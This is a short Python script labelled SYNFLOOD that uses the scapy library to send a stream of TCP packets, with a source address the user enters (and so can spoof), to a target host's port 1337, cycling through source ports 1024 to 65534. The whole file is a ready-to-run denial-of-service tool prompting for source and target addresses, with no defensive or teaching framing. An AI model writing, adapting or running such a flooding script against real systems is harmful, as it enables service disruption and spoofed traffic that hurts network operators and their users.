#/usr/bin/python
#SYNFLOOD
import scapy.all as scapy
def synFlood(src, tgt):
    for sport in range(1024, 65535):
        L3 = scapy.IP(src=src, dst=tgt)
        L4 = scapy.TCP(sport=sport, dport=1337)
        pkt = L3/L4
        scapy.send(pkt)

src = input("Insert source address: ")
tgt = input("Insert Target address: ")
synFlood(src,tgt)